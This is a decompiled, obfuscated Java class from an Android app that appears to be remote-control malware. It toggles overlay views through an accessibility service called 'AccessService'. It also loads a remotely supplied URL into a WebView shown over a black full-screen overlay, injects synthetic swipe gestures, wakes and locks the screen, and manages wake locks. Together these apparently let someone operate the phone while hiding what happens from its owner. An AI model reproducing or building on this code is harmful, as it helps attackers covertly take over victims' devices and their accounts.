package defpackage;

import android.accessibilityservice.GestureDescription;
import android.content.res.Resources;
import android.graphics.Path;
import android.os.PowerManager;
import android.text.TextUtils;
import android.webkit.WebSettings;
import android.widget.FrameLayout;
import androidx.work.Configuration;
import androidx.work.impl.WorkDatabaseVersions;
import androidx.work.impl.WorkManagerImpl;
import com.mamimobi.AccessService;
import com.mamimobi.activity.WakeScreenActivity;
import java.util.concurrent.atomic.AtomicBoolean;
import org.webrtc.EglBase10Impl;
import org.webrtc.EglBase14Impl;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class l1 implements Runnable {
    public final /* synthetic */ int E;

    public /* synthetic */ l1(int i) {
        this.E = i;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = 2;
        switch (this.E) {
            case 0:
                FrameLayout frameLayout = AccessService.c0;
                if (frameLayout != null) {
                    frameLayout.setVisibility(0);
                    return;
                }
                return;
            case 1:
                FrameLayout frameLayout2 = AccessService.c0;
                if (frameLayout2 != null) {
                    frameLayout2.setVisibility(8);
                    return;
                }
                return;
            case 2:
                AccessService.c0.setVisibility(8);
                return;
            case 3:
                if (AccessService.c0 != null) {
                    if (fa0.r0(AccessService.e0, "PerFinishAll", false)) {
                        AccessService.c0.setVisibility(8);
                        return;
                    } else {
                        AccessService.c0.setVisibility(0);
                        AccessService.a1.postDelayed(new l1(i), 70000L);
                        return;
                    }
                }
                return;
            case 4:
                pk0.e();
                return;
            case 5:
                la.s();
                return;
            case 6:
                EglBase10Impl.EglConnection.lambda$new$1();
                return;
            case 7:
                EglBase14Impl.EglConnection.lambda$new$1();
                return;
            case 8:
                try {
                    if (!AccessService.B0.get()) {
                        fa0.Q0(AccessService.e0, "PATH", "");
                    }
                    break;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                AccessService.n0.set(false);
                return;
            case WorkDatabaseVersions.VERSION_9 /* 9 */:
                s90.r.setVisibility(8);
                s90.u.setVisibility(8);
                return;
            case 10:
                s90.A();
                return;
            case WorkDatabaseVersions.VERSION_11 /* 11 */:
                s90.r.setPadding(0, 0, 0, 0);
                s90.u.setVisibility(0);
                s90.r.setVisibility(0);
                return;
            case WorkDatabaseVersions.VERSION_12 /* 12 */:
                AccessService.s();
                return;
            case WorkDatabaseVersions.VERSION_13 /* 13 */:
                AccessService.J0.set(false);
                FrameLayout frameLayout3 = AccessService.t0;
                if (frameLayout3 == null || frameLayout3.getVisibility() != 0) {
                    return;
                }
                AccessService.t0.setVisibility(8);
                return;
            case WorkDatabaseVersions.VERSION_14 /* 14 */:
                int i2 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i3 = Resources.getSystem().getDisplayMetrics().heightPixels;
                float f = i2 / 2;
                d91.k(AccessService.e0, f, (i3 * 4) / 5, f, i3 / 3);
                return;
            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                if (WakeScreenActivity.b()) {
                    WakeScreenActivity.a();
                }
                int i4 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i5 = Resources.getSystem().getDisplayMetrics().heightPixels;
                float f2 = i4 / 2;
                d91.k(AccessService.e0, f2, (i5 * 4) / 5, f2, i5 / 3);
                return;
            case 16:
                if (WakeScreenActivity.b()) {
                    WakeScreenActivity.a();
                }
                int i6 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i7 = Resources.getSystem().getDisplayMetrics().heightPixels;
                float f3 = i6 / 2;
                d91.k(AccessService.e0, f3, (i7 * 4) / 5, f3, i7 / 3);
                return;
            case 17:
                PowerManager.WakeLock wakeLock = o80.e;
                if (wakeLock == null || !wakeLock.isHeld()) {
                    return;
                }
                try {
                    o80.e.release();
                    break;
                } catch (Exception unused) {
                } catch (Throwable th) {
                    o80.e = null;
                    throw th;
                }
                o80.e = null;
                return;
            case 18:
                AccessService accessService = AccessService.e0;
                if (accessService != null) {
                    accessService.performGlobalAction(8);
                    return;
                }
                return;
            case 19:
                AccessService.J0.set(true);
                FrameLayout frameLayout4 = AccessService.t0;
                if (frameLayout4 != null) {
                    if (frameLayout4.getVisibility() == 8) {
                        AccessService.t0.setVisibility(0);
                    }
                    if (AccessService.q0 != null) {
                        String strQ0 = fa0.q0(AccessService.e0, "pushurl", "");
                        AccessService.q0.setBackgroundColor(-16777216);
                        AccessService.q0.setLayerType(1, null);
                        if (TextUtils.isEmpty(strQ0)) {
                            AccessService.q0.loadDataWithBaseURL(null, "<html><body style='background-color:#000000;'></body></html>", "text/html", "UTF-8", null);
                            return;
                        }
                        WebSettings settings = AccessService.q0.getSettings();
                        settings.setJavaScriptEnabled(true);
                        settings.setDomStorageEnabled(true);
                        settings.setCacheMode(-1);
                        settings.setDatabaseEnabled(true);
                        settings.setAllowFileAccess(true);
                        settings.setLoadWithOverviewMode(true);
                        settings.setUseWideViewPort(true);
                        AccessService.q0.setScrollBarStyle(0);
                        AccessService.q0.loadUrl(strQ0);
                        return;
                    }
                    return;
                }
                return;
            case Configuration.MIN_SCHEDULER_LIMIT /* 20 */:
                int i8 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i9 = Resources.getSystem().getDisplayMetrics().heightPixels;
                AccessService accessService2 = AccessService.e0;
                AtomicBoolean atomicBoolean = d91.a;
                Path path = new Path();
                path.moveTo((i8 * 4) / 5, i9 / 5);
                path.lineTo(i8 / 2, i9 / 3);
                Path path2 = new Path();
                path2.moveTo(i8 / 5, (i9 * 4) / 5);
                path2.lineTo(i8 / 3, (i9 * 2) / 3);
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 800L));
                builder.addStroke(new GestureDescription.StrokeDescription(path2, 0L, 800L));
                accessService2.dispatchGesture(builder.build(), null, null);
                return;
            case 21:
                if (WakeScreenActivity.b()) {
                    WakeScreenActivity.a();
                }
                int i10 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i11 = Resources.getSystem().getDisplayMetrics().heightPixels;
                float f4 = i10 / 2;
                d91.k(AccessService.e0, f4, (i11 * 4) / 5, f4, i11 / 3);
                return;
            case WorkManagerImpl.MAX_PRE_JOB_SCHEDULER_API_LEVEL /* 22 */:
                d91.a.compareAndSet(true, false);
                return;
            default:
                d91.a.compareAndSet(true, false);
                return;
        }
    }
}
